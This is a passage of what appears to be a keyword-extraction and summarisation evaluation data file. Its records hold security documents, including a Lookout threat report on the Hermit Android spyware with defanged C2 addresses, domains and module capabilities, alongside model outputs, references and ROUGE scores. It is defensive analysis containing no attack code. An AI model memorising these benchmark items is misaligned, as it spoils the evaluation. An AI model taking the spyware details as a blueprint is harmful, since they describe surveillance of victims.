Android users in India using a malicious app called PoriewSpy, which was developed from the Android Image Viewer open-source project. The malware steals sensitive information such as contacts, location, and call logs, and can record audio from victims' devices. The group behind the attacks may have ties to a cyberespionage group known for targeting government officials. The malicious apps were distributed through automatic downloads from malicious websites, and the malware hides its icon after displaying nude photos to users. The attackers may have used RATs like DroidJack and SandroRAT, as evidenced by similarities in their command and control servers. The malware operates by recording audio when the user makes a call, saving the files in a hidden directory on the device."]}, {"split_name": "val", "sample_id": "val_58", "prompt_text": "Extract the keywords: Kaspersky Security for Virtualization Integrated with VMware NSX platformData is your business\u2019s most important asset. So how and where that data is stored, processed and transmitted is critical not just to achieving a greater competitive advantage, but also to increasing operational efficiency and maintaining business continuity. There are many superior data processing, storage and networking solutions out there. But networking solutions in particular can be complex, inflexible and all too often tied to, and limited by, the hardware platform they\u2019re built on. This in turn impedes your data center\u2019s agility, and your ability to satisfy rapidly changing business requirements.Traditional security solutions do not meet your private cloud needs\u2022 Not elastic enough for your clouds \u2022 Cannot inter-operate via native API \u2022 Lack in providing full visibility on IT \u2022 Cause \u2018update and scanning storms\u2019 \u2022 Eat your private cloud resourcesHow You Benefit From Natively Integrated Agentless Security for VMware NSX:\u2022 Fully automated deployment of SVM, a specialized security appliance, based on the security polices applied to each protected VM on the hypervisor host.\u2022 Integration with NSX Security Policiesallows each protected VM to receive precise, granular security capabilities to let you scale corporate software-defined data center with no borders.\u2022 Integration with NSX Security Tagsallows your software-defined data center detect and react to most advanced threats in real-time fashion, and even reconfigure the entire infrastructure if necessary.\u2022 Full infrastructure scanning protects all VMs, whether they are on- or offline, for even better cybersecurity coverage right across your entire virtual infrastructure.\u2022 Proactive defense against cyberthreatsthrough use of the cloud-based Kaspersky Security Network.VMware\u00ae and Kaspersky Lab together address these issues through a joint solution built around a highly efficient Software-Defined Data Center, armed with advanced security capabilities to ensure high-level protection from internal or external threats, allowing you to work with different pools of network resources, dynamically creating or reconfiguring your entire network topology in a matter of seconds, using a \u201czero trust\u201d security approach.Kaspersky Security for Virtualization Agentless has been specifically designed to protect private clouds built on VMware NSX for vSphere. This joint solution delivers advanced security capabilities to each VM within your private cloud with near-zero impact on systems efficiency.Built-in VMware NSX ServicesDistributed FirewallVirtual networks (VXLAN)Server Activity MonitoringVPN (IPSec, SSL L2VPN)Kaspersky Security for VirtualizationAgentless Anti-malwareVirtual Network IDS/IPSServer Activity MonitoringSecurity Policies integrationSecurity Tags integrationScans even powered-off VMsNative interaction between your virtualization platform and its security solution means your private cloud can react in real time to any security incident across your entire infrastructure. Unified orchestration console lets your teams centrally manage the security of all your VMs, together with the Kaspersky Lab security products running on your physical servers, endpoints and even mobile devices, so it becomes easier for your team to manage entire hybrid cloud environment, with less pressure on IT resources, and less scope for human error.A perfectly balanced combination, so you can implement, orchestrate and scale security regardless of the size and complexity of your private cloud.Preserves the private cloud ROIBecause Kaspersky Security for Virtualization has been specifically developed to protect virtual machines (VMs), it helps businesses maintain a high machine density and high perfomance \u2013 preserving your virtualization ROI while eliminating update and scanning \u2018storms\u2019, together with Windows of Vulnerability or \u2018instant-on\u2019 gaps.Designed For Any VirtualizationsKaspersky Security for Virtualization is more than just \u2018designed for\u2019 virtualization platforms: it utilizes the core technologies of those platforms to optimize the security capabilities of both platform and security solution.From now on, your infrastructure and its security solution work in harness for maximum effectiveness.Shields Entire Virtual NetworkKaspersky\u2019s Network Attack Blocker monitors network traffic for signs of activity typical of network attacks.Kaspersky Security for Virtualization Agentless provides this network-level functionality together with support for both VMware vCloud Networking and Security and VMware NSX platforms.For Windows and Linux VMsKaspersky Security for Virtualization is truly a perfectly engineered solution for hybrid data centers that delivers advanced security capabilities to any virtual server regardless of the operating system running inside it.We protect both Windows and Linux servers, including RHEL 7GA, SLES 12 GA and Ubuntu 14.04 LTS.Specifically Designed for VMware NSX Security\u2022Interoperability with VMware NSX lets infrastructure and security layers work together in close co-operation, bringing new levels of automation and protection.\u2022 Automated deployment for VMware NSX allows the SVM (Security VirtualMachine) to \u2018pop up\u2019 automatically on the hypervisor, based on the requirements of the protected VMs sitting on that host.\u2022 Security Policy integration means each VM receives precise security capabilities,\u2022as defined by your corporate policies based on the VM\u2019s individual role. Integration with NSX Security Tags allows your private cloud to react in real-time to security incidents, automatically reconfiguring the entire infrastructure if necessary.Security Virtual Machine (SVM) \u2022 Natively integrates with VMware \u2022 Supports NSX and vShield Endpoint \u2022 No impact on platform performance \u2022 Anti-malware for Windows & Linux \u2022 Scans powered ON and OFF machinesNetwork Attack Blocker (NAB) \u2022 Powerful protection for networks \u2022 Web-tra(cid:10)c control with URL scanning \u2022 Heuristic analyzer to protect applications \u2022 Instant protection for entire infrastructureVMVMVMVMNABAutomated Security and Monitoring\u2022 Full infrastructure scanning protects all VMs, whether they are on- or offline,for even better security coverage right across your infrastructure.\u2022 Routine scanning of all VMs can be pre-scheduled at a granular level,so security tasks can be orchestrated according to your needs.\u2022 Self-protection and advanced SNMP-based monitoring guaranties that SVMs are always up and running, and able provide extensive information to 3rd-party monitoring tools for extra control.\u2022 Advanced protection will be never interrupted, even if a workload is movedthrough the cloud \u2013 VMware vMotion and Disaster Recovery\u2019s own capabilities are fully supported.Superior Reliability and Manageability\u2022 A single unified management console for virtual, physical and mobile devices means you can enforce consistent security policies across your entire IT estate. \u2022 Deployment with no downtime \u2013 no need to reboot any VMs or put the host\u2022server into maintenance mode. Intelligent scan task orchestration and automation eliminates any peaks in hypervisor resource consumption to preserve overall platform efficiency.\u2022 Feature-rich reporting and monitoring makes it easier to manage andsupervise security throughout your organization.The result is a powerful, elastic and fully secure private cloud environment. Learn more at www.kaspersky.com/enterpriseKaspersky Lab Enterprise Cybersecurity: www.kaspersky.com/enterprise Cyber Threats News: www.securelist.com IT Security News: business.kaspersky.com/#truecybersecurity #HuMachine ", "generated_text": "Kaspersky Security for Virtualization; a joint solution; vCloud; NSX; vSphere; the security appliance; advanced security capabilities; each VM; private cloud; no borders; protection; devices; commands; advanced detection; Windows; Linux; Virtual Network; firewall; IPSec; SSL; L2 VPN; NSX Security tags; NSX Networking; Advanced Security; vCloud Networking; Windows; Linux; devices; the solutions; visibility; security.", "ref_text": "<START-1>The document discusses the integration of Kaspersky Security for Virtualization with the VMware NSX platform to provide advanced security for software-defined data centers. Virtualization platforms like VMware NSX help data centers become more agile and dynamically configurable. However, traditional security solutions are not designed for these virtual environments and can impede performance and flexibility. The integrated Kaspersky-VMware solution allows unified orchestration and management of security policies across physical, virtual, and mobile endpoints. Key benefits include: - Automated deployment of security virtual machines (SVMs) based on policies applied to VMs on each hypervisor host. This provides granular security tailored to each VM's role. - Integration with NSX Security Tags lets the infrastructure automatically react and reconfigure in real-time in response to threats. - Agentless full infrastructure scanning, including offline VMs, eliminates gaps in security coverage. - Intelligent orchestration of scanning eliminates resource consumption peaks and disruption. - No downtime for VM reboot or server maintenance required for deployment. - Single console for managing consistent security across the hybrid infrastructure. - Utilizes VMware native capabilities for maximum interoperability and performance. In summary, the integrated solution allows software-defined data centers to implement elastic, automated security that is tailored to their needs, without impacting efficiency or agility. The native VMware-Kaspersky integration brings security into the software-defined infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.12903225806451613, "t5/word/hint_hit_recall": 0.051643192488262914, "gpt3/lexical/rouge_rouge1": 0.41212121212121205, "gpt3/lexical/rouge_rouge2": 0.17682926829268292, "gpt3/lexical/rouge_rougeL": 0.2545454545454545, "gpt3/lexical/rouge_rougeLsum": 0.2545454545454545, "gpt3_generated_text": ["The article discusses the integration of Kaspersky Security for Virtualization with VMware NSX platform to provide advanced security capabilities for private clouds. This joint solution offers protection for each virtual machine (VM) within the private cloud with near-zero impact on system efficiency. It includes features such as distributed firewall, server activity monitoring, VPN services, and network attack blocker. The solution is designed to work seamlessly with both Windows and Linux servers, offering advanced detection and protection for devices across the entire virtual network. The integration with NSX Security tags and networking allows for real-time reaction to threats and reconfiguration of the infrastructure if necessary, ensuring a high level of security for the entire virtualized environment."]}, {"split_name": "val", "sample_id": "val_59", "prompt_text": "Extract the keywords: www.lookout.com /blog/hermit-spyware-discovery Lookout Uncovers Android Spyware Deployed in KazakhstanLookout Threat Lab researchers have uncovered enterprise-grade Android surveillanceware used by the government of Kazakhstan within its borders. While we\u2019ve been following this threat for a while using Lookout Endpoint Detection and Response (EDR) these latest samples were detected in April 2022, four months after nation-wide protests against government policies were violently suppressed.Based on our analysis, the spyware, which we named \u201cHermit,\u201d is likely developed by Italian spyware vendor RCS Lab S.p.A and Tykelab Srl, a telecommunications solutions company we suspect to be operating as a front company.This isn't the first time Hermit has been deployed. We know that the Italian authorities used it in an anti-corruption operation in 2019. We also found evidence suggesting that an unknown actor used it in northeastern Syria, a predominantly Kurdish region that has been the setting of numerous regional conflicts.While some Hermit samples have been detected before and are broadly recognized as generic spyware, the connections we make in this blog to developers, campaigns and operators are new.RCS Lab, a known developer that has been active for over three decades, operates in the same market as Pegasus developer NSO Group Technologies and Gamma Group, which created FinFisher. Collectively branded as \u201clawful intercept\u201d companies, they claim to only sell to customers with legitimate use for surveillanceware, such as intelligence and law enforcement agencies. In reality, such tools have often been abused under the guise of national security to spy on business executives, human rights activists, journalists, academics and government officials. What is Hermit?Named after a distinct server path used by the attacker\u2019s command and control (C2), Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it\u2019s deployed.We obtained and analyzed 16 of the 25 known modules, each with unique capabilities. These modules, along with the permissions the core apps have, enable Hermit to exploit a rooted device, record audio and make and redirect phone calls, as well as collect data such as call logs, contacts, photos, device location and SMS messages.We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source. The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers. Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background.We\u2019re aware of an iOS version of Hermit but were unable to obtain a sample for analysis. Kazakhstan deploymentOur analysis suggests that Hermit has not only been deployed to Kazakhstan, but that an entity of the national government is likely behind the campaign. To our knowledge, this marks the first time that a current customer of RCS Lab\u2019s mobile malware has been identified.1/17We first detected samples from this campaign in April 2022. They were titled \u201coppo.service\u201d and impersonated Chinese electronic manufacturer Oppo. The website the malware used to mask its malicious activity is an official Oppo support page (url in the Kazakh language that has since gone offline. We also found samples that impersonate Samsung and Vivo.The now defunct Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background.The samples used in the Kazakh targeted campaign connected to the C2 address at 45.148.30[.]122:58442. However, further analysis of the spyware\u2019s C2 server revealed that this IP address is used as a proxy for the real C2 server at 85.159.27[.]61:8442. The real C2 IP address is administered by STS Telecom, a small internet service provider (ISP) operating out of Nur-Sultan, Kazakhstan\u2019s capital. Based on sparse online records, STS specializes in \u201cother wired telecommunications\u201d and cable services.2/17Our interaction with a poorly configured C2 server revealed the true C2 IP address.Syria, Italy and other targetsPrior to detecting the Kazakhstan samples, we found a reference to \u201cRojava,\u201d a Kurdish-speaking region in northeastern Syria, in the passive DNS records of Hermit. This is significant because the region has been the site of ongoing crises, such as the Syrian civil war and conflicts between the Islamic State (IS) and U.S.-led coalition support of the Kurdish-led Syrian Democratic Forces (SDF). Most recently, Turkey conducted a series of military operations against the SDF that resulted in partial occupation of the region.The domain we found (rojavanetwork[.]info) specifically imitates \u201cRojava Network,\u201d a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region, often in support of SDF operations.3/17The domain rojavanetwork[.]info seems to be specifically imitating \u201cRojava Network,\u201d a social media brand on Facebook and Twitter tha analysis of the region, often in support of SDF operations.Outside Syria, Hermit has been deployed in Italy. According to a document released by the Italian lower house in 2021, Italian authorities potentially misused it in an anti-corruption operation. The document mentioned an iOS version of Hermit and linked RCS Lab and Tykelab to the malware, which corroborates our analysis. RCS Lab and its controversial connectionsLike many spyware vendors, not much is known about RCS Lab and its clientele. But based on the information we do have, it has a considerable international presence.According to leaked documents published in WikiLeaks in 2015, RCS Lab was a reseller for another Italian spyware vendor HackingTeam, now known as Memento Labs, as early as 2012. Correspondences between the two companies revealed that RCS Lab engaged with military and intelligence agencies in Pakistan, Chile, Mongolia, Bangladesh, Vietnam, Myanmar and Turkmenistan \u2014 the latter three ranked as authoritarian regimes by the Democracy Index.RCS Lab also has past dealings with Syria, another authoritarian regime, as part of its collaboration with Berlin-based Advanced German Technology (AGT) to sell surveillance solutions.4/17Countries that had ties to RCS Lab\u2019s past business connections. Top row: Chile, Pakistan, Mongolia and Bangladesh; bottom row: MyaTykelab and its connection to RCS LabAccording to its own website, Tykelab provides innocuous technology solutions. However, we found various publicly- available clues that suggest otherwise. In addition to the Italian parliamentary document, we found several pieces of evidence tying Tykelab to RCS Lab.For example, a current Tykelab employee\u2019s LinkedIn profile indicates that they also work at RCS Lab. In addition, the company offers services that require skills that may be useful in the development and delivery of surveillanceware, such as knowledge or interaction with telecommunications networks, social media analysis, SMS services and mobile app development. One of the Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices.5/17This Tykelab job listing highlights interest in mobile network vulnerabilities, penetration testing, and reverse engineering: skills that canIn our own analysis of Hermit, we were able to tie Tykelab to Hermit and RCS Lab. One of the IP addresses Hermit used for C2 communications revealed an SSL certificate shared with another IP, 93.51.226[.]53. Notably, the shared certificate has Milan, Italy in the locality field which is where RCS Lab is headquartered.This second IP used another SSL certificate that directly named RCS as the organization and Tykelab as the organization unit. The location references Rome, which is the headquarters location of Tykelab6/17An SSL certificate tied to Hermit infrastructure shows that Tykelab and RCS Lab are both connected to the spyware.Technical analysis: Hermit\u2019s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise-grade capabilities to collect and transmit data.For example, it uses 20-plus parameters, which enables any operator to tailor it to their campaign. The spyware also attempts to maintain data integrity of collected \u2018evidence\u2019 by sending a hash-based message authentication code (HMAC). This allows the actors to authenticate who sent the data as well as ensure the data is unchanged. Using this method for data transmission may enable the admissibility of collected evidence.To cover up its true intentions, Hermit is built to be modular. This means malicious functionality is hidden inside additional payloads that the malware downloads as needed.How it tricks victims and avoids detectionAs we mentioned earlier, Hermit pretends to come from legitimate entities, namely telecommunications companies or smartphone manufacturers. To keep up this facade, the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background.The first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server. But before communication happens, Hermit performs a series of checks to ensure that it isn\u2019t being analyzed. This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier.Modules and data collectionOnce the malware connects with the C2, it takes instructions on what modules to download, each with distinct capabilities. In addition to the modules, the permissions that the malware requests indicate the various ways it could collect data.Hermit can be asked by the C2 to download modules from any URL and then load them dynamically.In total we acquired 16 modules by interacting with the IP address (45.148.30[.]122:58442) \u201coppo.service\u201d used for C2 communications. Based on identification numbers assigned to the modules in Hermit\u2019s code, there are at least 25 modules.7/17Within the core app, we found an abstract class called \u201cmodule\u201d that provided additional hints as to what the rest of the modules are capable of. The code contained references to exploit usage, which was further confirmed by clues found in obtained modules. While we weren\u2019t served exploits during testing, we can tell that an exploited device will modules that can use exploits.If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service. This service will then be used to enable elevated device privileges such as access to accessibility services, notification content, package use state and the ability to ignore battery optimization.Beyond the root service, some of the modules expect or attempt to use root access directly through a su binary. These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction.While this may be a generic attempt at using root without user awareness, SuperSU may also be a part of the unknown exploitation process. If root is not available, the modules may prompt the user to take actions which will accomplish the same goals.These are the modules we were able to acquire (refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book TelegramLike other weaponry, spyware can easily be abusedVendors of so-called \u201clawful intercept\u201d spyware, such as RCS Lab, the NSO Group and Gamma Group, usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism. However, there have been many reports, especially in recent years, of spyware being misused.We found evidence of Hermit being deployed in Kazakhstan and Syria, countries with poor human rights records. Even in the case of the anti-corruption operations in Italy, there was alleged mishandling of personal and private data.In a sense, electronic surveillance tools are not that different from any other type of weaponry. Just this month, faced with financial pressure, CEO of the NSO group Shalev Hulio opened up the possibility of selling to \u201crisky\u201d clients. Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear-cut as they project.How to protect yourself from spyware like HermitWith sophisticated data collection capabilities, and the fact that we carry them all the time, mobile devices are the perfect target for surveillance. While not all of us will be targeted by sophisticated spyware, here are some tips to keep yourself and your organization safe:8/17Update your phone and apps: operating systems and apps will often have vulnerabilities that need to be patched. Update them to ensure the exploits are resolved. Don\u2019t click on unknown links: one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source. Don\u2019t click on links, especially when you don\u2019t know the source. Don\u2019t install unknown apps: exercise caution when installing unknown apps, even if the source of the app seems like a legitimate authority. Periodically review your apps: sometimes malware can change settings or install additional content to your phone. Check your phone periodically to ensure nothing unknown has been added.In addition to following the security best practices outlined above, we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks.To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats. Indicators of Compromise Core App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in Hermit\u2019s targeting operations119-tim[.]info 133-tre[.]info 146-fastweb[.]info 155-wind[.]info 159-windtre[.]info iliad[.]info amex-co[.]info cloud-apple[.]info fb-techsupport[.]commilf[.]house kena-mobile[.]info poste-it[.]info rojavanetwork[.]info store-apple[.]info wind-h3g[.]infoParameter configurations Hermit usesParameter vps p1,p3,p4,p5,p6 Certificate fingerprint, IP address, and port, for C2 communication Server endpoints for various C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden. String used along with android_id as a unique device identifier Expected signature of the app. If the signature does not match the app will not run. Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre-shared key used for message authentication Boolean indicating whether APK files should be deleted if anti- emulation checks fail Fingerprint for protobuf encryption setup Public key for protobuf encryption setup9/17applicationId, gcmSenderId projectId, storageBucket apiKeyModules downloaded by HermitFirebase Messaging Service setup parametersModule ClipboardDevice InfoFunctionNoteTrack foreground app. Steal stored account emails. Steal browser bookmarks / searches. Steal calendar events, attendees. Take pictures. Steal current and future clipboard content. Exfiltrate device information, including:Applications root/exploitation statusDownload and install APK files on the File Upload Upload files from the device. LogEnable/disable verbose logging. Exfiltrate notification content. Dismiss/snooze notifications that reference, but don\u2019t originate from, the Hermit app. Take pictures of the screen.Notification Telegram Prompt the user to reinstall Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall WhatsAppvia Play Store.Use root to silently install apps. Use root to copy files the app doesn\u2019t have access to.Use root to run \u2018screencap\u2019 Use root to silently uninstall/reinstall Telegram. Also copy the old app\u2019s data to the new app\u2019s folder, changing the files\u2019 SELinux contexts and ownersLookout Threat Lab researchers have uncovered enterprise-grade Android surveillanceware used by the government of Kazakhstan within its borders. While we\u2019ve been following this threat for a while using Lookout Endpoint Detection and Response (EDR) these latest samples were detected in April 2022, four months after nation-wide protests against government policies were violently suppressed.Based on our analysis, the spyware, which we named \u201cHermit,\u201d is likely developed by Italian spyware vendor RCS Lab S.p.A and Tykelab Srl, a telecommunications solutions company we suspect to be operating as a front company.This isn't the first time Hermit has been deployed. We know that the Italian authorities used it in an anti-corruption operation in 2019. We also found evidence suggesting that an unknown actor used it in northeastern Syria, a predominantly Kurdish region that has been the setting of numerous regional conflicts.While some Hermit samples have been detected before and are broadly recognized as generic spyware, the connections we make in this blog to developers, campaigns and operators are new.RCS Lab, a known developer that has been active for over three decades, operates in the same market as Pegasus developer NSO Group Technologies and Gamma Group, which created FinFisher. Collectively branded as \u201clawful intercept\u201d companies, they claim to only sell to customers with legitimate use for surveillanceware, such as intelligence and law enforcement agencies. In reality, such tools have often been abused under the guise of national security to spy on business executives, human rights activists, journalists, academics and government officials. What is Hermit?Named after a distinct server path used by the attacker\u2019s command and control (C2), Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it\u2019s deployed.We obtained and analyzed 16 of the 25 known modules, each with unique capabilities. These modules, along with the permissions the core apps have, enable Hermit to exploit a rooted device, record audio and make and redirect phone calls, as well as collect data such as call logs, contacts, photos, device location and SMS messages.10/17We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source. The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers. Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background.We\u2019re aware of an iOS version of Hermit but were unable to obtain a sample for analysis. Kazakhstan deploymentOur analysis suggests that Hermit has not only been deployed to Kazakhstan, but that an entity of the national government is likely behind the campaign. To our knowledge, this marks the first time that a current customer of RCS Lab\u2019s mobile malware has been identified.We first detected samples from this campaign in April 2022. They were titled \u201coppo.service\u201d and impersonated Chinese electronic manufacturer Oppo. The website the malware used to mask its malicious activity is an official Oppo support page (url in the Kazakh language that has since gone offline. We also found samples that impersonate Samsung and Vivo.The now defunct Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background.The samples used in the Kazakh targeted campaign connected to the C2 address at 45.148.30[.]122:58442. However, further analysis of the spyware\u2019s C2 server revealed that this IP address is used as a proxy for the real C2 server at 85.159.27[.]61:8442. The real C2 IP address is administered by STS Telecom, a small internet service provider (ISP) operating out of Nur-Sultan, Kazakhstan\u2019s capital. Based on sparse online records, STS specializes in \u201cother wired telecommunications\u201d and cable services.11/17Our interaction with a poorly configured C2 server revealed the true C2 IP address.Syria, Italy and other targetsPrior to detecting the Kazakhstan samples, we found a reference to \u201cRojava,\u201d a Kurdish-speaking region in northeastern Syria, in the passive DNS records of Hermit. This is significant because the region has been the site of ongoing crises, such as the Syrian civil war and conflicts between the Islamic State (IS) and U.S.-led coalition support of the Kurdish-led Syrian Democratic Forces (SDF). Most recently, Turkey conducted a series of military operations against the SDF that resulted in partial occupation of the region.The domain we found (rojavanetwork[.]info) specifically imitates \u201cRojava Network,\u201d a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region, often in support of SDF operations.The domain rojavanetwork[.]info seems to be specifically imitating \u201cRojava Network,\u201d a social media brand on Facebook and Twitter tha analysis of the region, often in support of SDF operations.Outside Syria, Hermit has been deployed in Italy. According to a document released by the Italian lower house in 2021, Italian authorities potentially misused it in an anti-corruption operation. The document mentioned an iOS version of Hermit and linked RCS Lab and Tykelab to the malware, which corroborates our analysis. RCS Lab and its controversial connections12/17Like many spyware vendors, not much is known about RCS Lab and its clientele. But based on the information we do have, it has a considerable international presence.According to leaked documents published in WikiLeaks in 2015, RCS Lab was a reseller for another Italian spyware vendor HackingTeam, now known as Memento Labs, as early as 2012. Correspondences between the two companies revealed that RCS Lab engaged with military and intelligence agencies in Pakistan, Chile, Mongolia, Bangladesh, Vietnam, Myanmar and Turkmenistan \u2014 the latter three ranked as authoritarian regimes by the Democracy Index.RCS Lab also has past dealings with Syria, another authoritarian regime, as part of its collaboration with Berlin-based Advanced German Technology (AGT) to sell surveillance solutions.Countries that had ties to RCS Lab\u2019s past business connections. Top row: Chile, Pakistan, Mongolia and Bangladesh; bottom row: MyaTykelab and its connection to RCS LabAccording to its own website, Tykelab provides innocuous technology solutions. However, we found various publicly- available clues that suggest otherwise. In addition to the Italian parliamentary document, we found several pieces of evidence tying Tykelab to RCS Lab.For example, a current Tykelab employee\u2019s LinkedIn profile indicates that they also work at RCS Lab. In addition, the company offers services that require skills that may be useful in the development and delivery of surveillanceware, such as knowledge or interaction with telecommunications networks, social media analysis, SMS services and mobile app development. One of the Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices.This Tykelab job listing highlights interest in mobile network vulnerabilities, penetration testing, and reverse engineering: skills that canIn our own analysis of Hermit, we were able to tie Tykelab to Hermit and RCS Lab. One of the IP addresses Hermit used for C2 communications revealed an SSL certificate shared with another IP, 93.51.226[.]53. Notably, the shared certificate has Milan, Italy in the locality field which is where RCS Lab is headquartered.This second IP used another SSL certificate that directly named RCS as the organization and Tykelab as the organization unit. The location references Rome, which is the headquarters location of Tykelab13/17An SSL certificate tied to Hermit infrastructure shows that Tykelab and RCS Lab are both connected to the spyware.Technical analysis: Hermit\u2019s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise-grade capabilities to collect and transmit data.For example, it uses 20-plus parameters, which enables any operator to tailor it to their campaign. The spyware also attempts to maintain data integrity of collected \u2018evidence\u2019 by sending a hash-based message authentication code (HMAC). This allows the actors to authenticate who sent the data as well as ensure the data is unchanged. Using this method for data transmission may enable the admissibility of collected evidence.To cover up its true intentions, Hermit is built to be modular. This means malicious functionality is hidden inside additional payloads that the malware downloads as needed.How it tricks victims and avoids detectionAs we mentioned earlier, Hermit pretends to come from legitimate entities, namely telecommunications companies or smartphone manufacturers. To keep up this facade, the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background.The first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server. But before communication happens, Hermit performs a series of checks to ensure that it isn\u2019t being analyzed. This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier.Modules and data collectionOnce the malware connects with the C2, it takes instructions on what modules to download, each with distinct capabilities. In addition to the modules, the permissions that the malware requests indicate the various ways it could collect data.Hermit can be asked by the C2 to download modules from any URL and then load them dynamically.In total we acquired 16 modules by interacting with the IP address (45.148.30[.]122:58442) \u201coppo.service\u201d used for C2 communications. Based on identification numbers assigned to the modules in Hermit\u2019s code, there are at least 25 modules.14/17Within the core app, we found an abstract class called \u201cmodule\u201d that provided additional hints as to what the rest of the modules are capable of. The code contained references to exploit usage, which was further confirmed by clues found in obtained modules. While we weren\u2019t served exploits during testing, we can tell that an exploited device will modules that can use exploits.If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service. This service will then be used to enable elevated device privileges such as access to accessibility services, notification content, package use state and the ability to ignore battery optimization.Beyond the root service, some of the modules expect or attempt to use root access directly through a su binary. These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction.While this may be a generic attempt at using root without user awareness, SuperSU may also be a part of the unknown exploitation process. If root is not available, the modules may prompt the user to take actions which will accomplish the same goals.These are the modules we were able to acquire (refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book TelegramLike other weaponry, spyware can easily be abusedVendors of so-called \u201clawful intercept\u201d spyware, such as RCS Lab, the NSO Group and Gamma Group, usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism. However, there have been many reports, especially in recent years, of spyware being misused.We found evidence of Hermit being deployed in Kazakhstan and Syria, countries with poor human rights records. Even in the case of the anti-corruption operations in Italy, there was alleged mishandling of personal and private data.In a sense, electronic surveillance tools are not that different from any other type of weaponry. Just this month, faced with financial pressure, CEO of the NSO group Shalev Hulio opened up the possibility of selling to \u201crisky\u201d clients. Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear-cut as they project.How to protect yourself from spyware like HermitWith sophisticated data collection capabilities, and the fact that we carry them all the time, mobile devices are the perfect target for surveillance. While not all of us will be targeted by sophisticated spyware, here are some tips to keep yourself and your organization safe:15/17Update your phone and apps: operating systems and apps will often have vulnerabilities that need to be patched. Update them to ensure the exploits are resolved. Don\u2019t click on unknown links: one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source. Don\u2019t click on links, especially when you don\u2019t know the source. Don\u2019t install unknown apps: exercise caution when installing unknown apps, even if the source of the app seems like a legitimate authority. Periodically review your apps: sometimes malware can change settings or install additional content to your phone. Check your phone periodically to ensure nothing unknown has been added.In addition to following the security best practices outlined above, we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks.To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats. Indicators of Compromise Core App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in Hermit\u2019s targeting operations119-tim[.]info 133-tre[.]info 146-fastweb[.]info 155-wind[.]info 159-windtre[.]info iliad[.]info amex-co[.]info cloud-apple[.]info fb-techsupport[.]commilf[.]house kena-mobile[.]info poste-it[.]info rojavanetwork[.]info store-apple[.]info wind-h3g[.]infoParameter configurations Hermit usesParameter vps p1,p3,p4,p5,p6 Certificate fingerprint, IP address, and port, for C2 communication Server endpoints for various C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden. String used along with android_id as a unique device identifier Expected signature of the app. If the signature does not match the app will not run. Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre-shared key used for message authentication Boolean indicating whether APK files should be deleted if anti- emulation checks fail Fingerprint for protobuf encryption setup Public key for protobuf encryption setup16/17applicationId, gcmSenderId projectId, storageBucket apiKeyModules downloaded by HermitFirebase Messaging Service setup parametersModule ClipboardDevice InfoFunctionNoteTrack foreground app. Steal stored account emails. Steal browser bookmarks / searches. Steal calendar events, attendees. Take pictures. Steal current and future clipboard content. Exfiltrate device information, including:Applications root/exploitation statusDownload and install APK files on the File Upload Upload files from the device. LogEnable/disable verbose logging. Exfiltrate notification content. Dismiss/snooze notifications that reference, but don\u2019t originate from, the Hermit app. Take pictures of the screen.Notification Telegram Prompt the user to reinstall Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall WhatsAppvia Play Store.Use root to silently install apps. Use root to copy files the app doesn\u2019t have access to.Use root to run \u2018screencap\u2019 Use root to silently uninstall/reinstall Telegram. Also copy the old app\u2019s data to the new app\u2019s folder, changing the files\u2019 SELinux contexts 